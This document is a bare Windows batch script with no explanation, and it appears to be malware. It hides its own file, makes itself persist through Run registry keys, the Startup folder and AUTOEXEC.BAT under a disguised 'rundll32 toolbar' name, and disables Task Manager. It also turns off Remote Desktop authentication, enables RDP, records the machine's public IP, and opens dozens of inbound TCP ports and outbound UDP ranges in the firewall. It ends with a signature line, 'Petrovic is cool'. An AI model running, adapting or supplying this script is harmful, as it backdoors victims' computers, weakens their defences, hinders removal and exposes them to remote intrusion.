@echo off
attrib +h +s %0
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
cls
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
netsh firewall set service type = remotedesktop mode = enable
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net start TermService
cd %userprofile%
curl -s -o IP.txt https://ipv4.wtfismyip.com/text
set /p IPv4=<IP.txt
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3001
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3002
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3003
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3004
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3005
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3006
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3007
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3008
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3009
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3010
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3011
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3012
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3013
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3014
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3015
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3016
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3017
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3018
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3019
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3020
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3021
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3022
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3023
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3024
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3025
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3026
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3027
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3028
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3029
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3030
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3031
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3032
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3033
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3034
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3035
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3036
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3037
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3038
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3039
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3040
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=3041
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" dir=in action=allow protocol=TCP localport=%random%
netsh advfirewall firewall add rule name="%random%" protocol=UDP dir=out localport=4000-9000 action=allow
netsh advfirewall firewall add rule name="%random%" protocol=UDP dir=out localport=%random%-%random% action=allow
echo Petrovic is cool > "Petrovic.txt"